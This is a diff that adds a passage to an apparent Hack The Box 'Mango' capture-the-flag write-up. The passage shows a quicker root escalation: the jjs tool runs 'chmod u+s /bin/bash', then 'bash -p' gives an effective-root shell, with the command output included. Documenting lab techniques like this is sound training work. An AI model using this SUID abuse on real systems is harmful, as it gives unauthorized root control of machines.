@@ -245,3 +245,16 @@ Saved as: met
 ![](/assets/images/htb-writeup-mango/root2.png)
 
 ![](/assets/images/htb-writeup-mango/root3.png)
+
+Or, a faster way to get a root shell is to make bash SUID:
+
+```
+admin@mango:/home/admin$ jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
+0
+jjs> 
+admin@mango:/home/admin$ /bin/bash -p
+bash-4.4# id
+uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
+```
